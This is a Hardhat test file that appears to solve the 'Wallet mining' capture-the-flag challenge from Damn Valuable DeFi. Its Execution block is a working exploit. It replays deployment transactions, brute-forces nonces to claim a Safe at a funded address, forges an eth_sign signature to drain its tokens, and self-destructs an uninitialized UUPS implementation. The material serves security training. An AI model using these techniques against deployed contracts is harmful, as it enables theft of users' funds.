const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: 'uups', initializer: 'init' }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
    await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(walletDeployer.address, initialWalletDeployerTokenBalance);

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(initialWalletDeployerTokenBalance);
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const data = require('./data.json');

    const deployerExploit = walletDeployer.connect(player);
    const authorizerExploit = authorizer.connect(player);

    await player.sendTransaction({ to: data.DEPLOYER, value: ethers.utils.parseEther('1') });

    // nonce 0
    const safe = (await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE)).wait()).contractAddress;

    // nonce 1
    (await (await ethers.provider.sendTransaction(data.NONCE_1)).wait()).contractAddress;

    // nonce 2
    const factory = (await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY)).wait()).contractAddress;

    const proxyFactory = await ethers.getContractAt('GnosisSafeProxyFactory', factory, player);

    const createInterface = (signature, methodName, arguments) => {
      const ABI = signature;
      const IFace = new ethers.utils.Interface(ABI);
      const ABIData = IFace.encodeFunctionData(methodName, arguments);
      return ABIData;
    };

    const safeABI = [
      'function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)',
      'function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)',
      'function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)',
    ];
    const setupDummyABIData = createInterface(safeABI, 'setup', [
      [player.address],
      1,
      ethers.constants.AddressZero,
      0,
      ethers.constants.AddressZero,
      ethers.constants.AddressZero,
      0,
      ethers.constants.AddressZero,
    ]);

    let nonceRequired = 0;
    let address = '';
    while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {
      address = ethers.utils.getContractAddress({
        from: factory,
        nonce: nonceRequired,
      });
      nonceRequired += 1;
    }

    for (let i = 0; i < nonceRequired; i++) {
      await proxyFactory.createProxy(safe, setupDummyABIData);
    }

    // Create transfer interface for execTransaction
    const tokenABI = ['function transfer(address to, uint256 amount)'];
    const tokenABIData = createInterface(tokenABI, 'transfer', [player.address, DEPOSIT_TOKEN_AMOUNT]);

    // Create an execTransaction that transfers all tokens back to the player

    // 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
    // 2. sign transaction hash
    // 3. Add 4 to v as per gnosis spec to show it is an eth_sign tx https://docs.gnosis-safe.io/learn/safe-tools/signatures
    // 3. Send it through exec transaction

    const depositAddrSafe = await ethers.getContractAt('GnosisSafe', DEPOSIT_ADDRESS, player);

    // Params for the execTransaction
    const transactionParams = [
      token.address,
      0,
      tokenABIData,
      0,
      0,
      0,
      0,
      ethers.constants.AddressZero,
      ethers.constants.AddressZero,
      0,
    ];

    // Get tx hash from generated from the contract
    const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
    const signed = await player.signMessage(ethers.utils.arrayify(txhash));

    // Increase v by 4
    const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();
    await depositAddrSafe.execTransaction(...transactionParams.slice(0, -1), signedIncreaseV);

    const implementationSlot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
    const implementationAddress =
      '0x' + (await ethers.provider.getStorageAt(authorizerExploit.address, implementationSlot)).slice(-40);

    const implementationContract = await ethers.getContractAt('AuthorizerUpgradeable', implementationAddress, player);

    const exploitContractFactory = await ethers.getContractFactory('WalletMinerExploit', player);
    const exploitContract = await exploitContractFactory.deploy();

    const attackABI = ['function destroy()'];
    const IAttack = createInterface(attackABI, 'destroy', []);

    await implementationContract.init([], []);
    await implementationContract.upgradeToAndCall(exploitContract.address, IAttack);

    for (let i = 0; i < 43; i++) {
      await (await deployerExploit.drop(setupDummyABIData)).wait();
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.not.eq('0x');

    // Master copy account must have code
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.not.eq('0x');

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq('0x');

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
  });
});
